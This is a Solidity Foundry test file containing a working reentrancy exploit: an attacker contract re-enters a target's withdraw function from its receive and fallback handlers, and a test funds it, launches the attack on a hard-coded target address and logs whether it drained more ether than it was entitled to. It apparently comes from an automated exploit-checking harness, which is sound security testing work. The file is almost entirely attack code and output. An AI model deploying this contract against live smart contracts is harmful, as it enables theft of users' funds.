// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

contract LowkeyBreakReentrant {
    address public immutable target;
    bytes public payload;
    uint256 public attempts;
    uint256 public successes;
    bool public lastSeedSuccess;
    bool public lastAttackSuccess;
    bytes public lastSeedReturndata;
    bytes public lastAttackReturndata;

    constructor(address _target) {
        target = _target;
    }

    function setPayload(bytes calldata _payload) external {
        payload = _payload;
    }

    function seed(bytes calldata data) external payable {
        (bool ok, bytes memory returndata) = target.call{value: msg.value}(data);
        lastSeedSuccess = ok;
        lastSeedReturndata = returndata;
        emit TargetCall("SEED", ok, returndata);
    }

    function attack() external payable {
        (bool ok, bytes memory returndata) = target.call{value: msg.value}(payload);
        lastAttackSuccess = ok;
        lastAttackReturndata = returndata;
        emit TargetCall("OUTER", ok, returndata);
    }

    event TargetCall(string phase, bool success, bytes returndata);

    receive() external payable {
        _reenter();
    }

    fallback() external payable {
        _reenter();
    }

    function _reenter() internal {
        if (attempts >= 3) return;
        attempts++;
        (bool ok, ) = target.call(payload);
        if (ok) successes++;
    }
}

contract LowkeyBreakReentrancy is Test {
    address constant TARGET = address(uint160(0x005fbdb2315678afecb367f032d93f642f64180aa3));

    function test_break_reentrancy() public {
        LowkeyBreakReentrant hostile = new LowkeyBreakReentrant(TARGET);
        bytes memory payload = abi.encodeWithSignature("withdraw(address,uint256)", address(hostile), 1);
        hostile.setPayload(payload);
        vm.deal(address(this), 100 ether);
        vm.deal(address(hostile), 100 ether);
        uint256 targetBalanceBeforeFunding = TARGET.balance;
        vm.deal(TARGET, 10 ether);
        uint256 targetBalanceBeforeSetup = TARGET.balance;

        bytes memory setupData = abi.encodeWithSignature("deposit()");
        (bool seeded, ) = address(hostile).call{value: 10 ether}(
            abi.encodeWithSignature("seed(bytes)", setupData)
        );
        console2.log("SETUP_WRAPPER_SUCCESS", seeded);
        console2.log("SETUP_VALUE_WEI", uint256(10 ether));
        uint256 targetBalanceAfterSetup = TARGET.balance;

        (bool entitlementSetupOk, bytes memory entitlementSetupData) = TARGET.staticcall(
            abi.encodeWithSignature("balances(address)", address(hostile))
        );
        uint256 entitlementAfterSetup = 0;
        if (entitlementSetupOk && entitlementSetupData.length >= 32) {
            entitlementAfterSetup = abi.decode(entitlementSetupData, (uint256));
        }
        console2.log("ENTITLEMENT_SETUP_READ_OK", entitlementSetupOk);
        console2.log("ENTITLEMENT_AFTER_SETUP", entitlementAfterSetup);

        uint256 beforeHostile = address(hostile).balance;
        uint256 beforeTarget = TARGET.balance;
        uint256 entitlementBeforeAttack = 0;
        bool entitlementBeforeAttackOk = false;


        {
            (bool ok, bytes memory data) = TARGET.staticcall(
                abi.encodeWithSignature("balances(address)", address(hostile))
            );
            entitlementBeforeAttackOk = ok && data.length >= 32;
            if (entitlementBeforeAttackOk) {
                entitlementBeforeAttack = abi.decode(data, (uint256));
            }
        }


        (bool outer, ) = address(hostile).call{value: 1 wei}(
            abi.encodeWithSignature("attack()")
        );

        uint256 afterHostile = address(hostile).balance;
        uint256 afterTarget = TARGET.balance;
        uint256 entitlementAfterAttack = 0;

        {
            (bool ok, bytes memory data) = TARGET.staticcall(
                abi.encodeWithSignature("balances(address)", address(hostile))
            );
            if (ok && data.length >= 32) {
                entitlementAfterAttack = abi.decode(data, (uint256));
            }
        }


        uint256 outerInput = 1 wei;
        uint256 received = afterHostile > beforeHostile + outerInput
            ? afterHostile - beforeHostile - outerInput
            : 0;
        uint256 targetLoss = beforeTarget > afterTarget ? beforeTarget - afterTarget : 0;

        console2.log("LOWKEY_BREAK_FAMILY", "reentrancy");
        console2.log("HOSTILE_WRAPPER_SUCCESS", outer);
        console2.log("TARGET_SETUP_SUCCESS", hostile.lastSeedSuccess());
        console2.log("TARGET_SETUP_RETURNDATA_LENGTH", hostile.lastSeedReturndata().length);
        console2.log("TARGET_BALANCE_BEFORE_FUNDING", targetBalanceBeforeFunding);
        console2.log("TARGET_BALANCE_BEFORE_SETUP", targetBalanceBeforeSetup);
        console2.log("TARGET_BALANCE_AFTER_SETUP", targetBalanceAfterSetup);
        console2.logBytes(hostile.lastSeedReturndata());
        console2.log("TARGET_OUTER_SUCCESS", hostile.lastAttackSuccess());
        console2.log("TARGET_OUTER_RETURNDATA_LENGTH", hostile.lastAttackReturndata().length);
        console2.logBytes(hostile.lastAttackReturndata());
        console2.log("TARGET_CODE_LENGTH", TARGET.code.length);
        console2.log("TARGET_BALANCE_AFTER_SETUP", TARGET.balance);
        console2.log("REENTRY_ATTEMPTS", hostile.attempts());
        console2.log("REENTRY_SUCCESSES", hostile.successes());
        console2.log("ATTACKER_WITHDRAW_RECEIVED", received);
        console2.log("ENTITLEMENT_BEFORE_ATTACK", entitlementBeforeAttack);
        console2.log("ENTITLEMENT_BEFORE_ATTACK_READ_OK", entitlementBeforeAttackOk);
        console2.log("ENTITLEMENT_AFTER_ATTACK", entitlementAfterAttack);
        console2.log("TARGET_LOSS", targetLoss);

        bool exceededEntitlement = entitlementBeforeAttackOk
            && hostile.successes() > 0
            && received > entitlementBeforeAttack;
        bool genericValueBreak = !entitlementBeforeAttackOk
            && hostile.successes() > 0
            && received > 1 wei
            && targetLoss > 1 wei;

        if (exceededEntitlement || genericValueBreak) {
            console2.log("LOWKEY_BREAK", true);
        } else {
            console2.log("LOWKEY_BREAK", false);
        }
    }
}
